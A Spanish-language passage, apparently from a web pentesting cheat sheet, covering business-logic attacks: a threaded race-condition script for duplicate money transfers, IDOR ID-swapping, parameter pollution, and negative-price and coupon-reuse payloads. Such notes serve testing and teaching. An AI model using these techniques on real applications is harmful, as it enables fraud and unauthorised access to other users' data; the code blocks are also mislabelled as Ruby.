

### Metodología

1. **Entender la lógica de negocio**: Cómo funciona la aplicación y sus flujos
2. **Identificar asunciones débiles**: Buscar validaciones solo en cliente, checks incompletos
3. **Probar casos extremos**: Valores negativos, cantidades grandes, condiciones de carrera
4. **Manipular flujos**: Saltar pasos, repetir acciones, cambiar orden
5. **Explotar inconsistencias**: Entre validación y ejecución, entre frontend y backend


### Race conditions

```ruby
# Explotar condición de carrera en transferencia de dinero
import threading

def transfer():
    requests.post('http://vulnerable.com/transfer', 
                  data={'to':'attacker', 'amount':1000})

threads = []
for i in range(10):
    t = threading.Thread(target=transfer)
    threads.append(t)
    t.start()
```


### IDOR (Insecure Direct Object Reference)

```ruby
# Cambiar ID en URL
http://vulnerable.com/user/profile?id=123
http://vulnerable.com/user/profile?id=124  # Ver perfil de otro usuario

# En APIs
GET /api/invoice/1001  → Cambiar a /api/invoice/1002
GET /api/user/5/details → Cambiar a /api/user/6/details
```


### Parameter pollution

```ruby
# Enviar el mismo parámetro múltiples veces
email=user@test.com&email=admin@test.com

# El servidor puede usar el segundo valor
# O concatenar ambos
```


### Business logic flaws

```ruby
# Precio negativo en compra
amount=-100  # Recibir dinero en lugar de pagar

# Usar cupón múltiples veces
POST /apply-coupon
coupon_code=DISCOUNT50

# Modificar cantidad después de validación
quantity=1 (validado)
quantity=100 (al procesar)
```



